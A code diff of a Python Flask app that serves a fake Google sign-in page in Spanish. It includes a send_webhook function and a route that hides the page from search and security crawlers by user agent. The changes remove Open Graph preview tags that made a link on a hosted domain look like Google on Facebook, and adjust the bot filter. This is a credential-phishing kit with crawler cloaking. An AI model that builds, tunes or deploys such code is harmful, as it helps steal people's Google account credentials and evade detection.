@@ -41,12 +41,6 @@ def get_template():
 <html>
 <head>
     <meta charset="UTF-8">
-    <!-- METADATOS PARA FACEBOOK -->
-    <meta property="og:title" content="Iniciar sesión - Google" />
-    <meta property="og:description" content="Accede a tu cuenta de Google de forma segura" />
-    <meta property="og:image" content="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" />
-    <meta property="og:url" content="https://video-xeen.onrender.com" />
-    <meta property="og:type" content="website" />
     <title>Iniciar sesión - Google</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
@@ -199,7 +193,7 @@ def send_webhook(data):
 @app.route('/')
 def index():
     user_agent = request.headers.get('User-Agent', '')
-    bots = ['bot', 'crawler', 'spider', 'google', 'bing']
+    bots = ['bot', 'crawler', 'spider', 'google', 'bing']  # <--- 'facebook' eliminado
     if any(bot in user_agent.lower() for bot in bots):
         return "404 Not Found", 404
     return render_template_string(get_template())
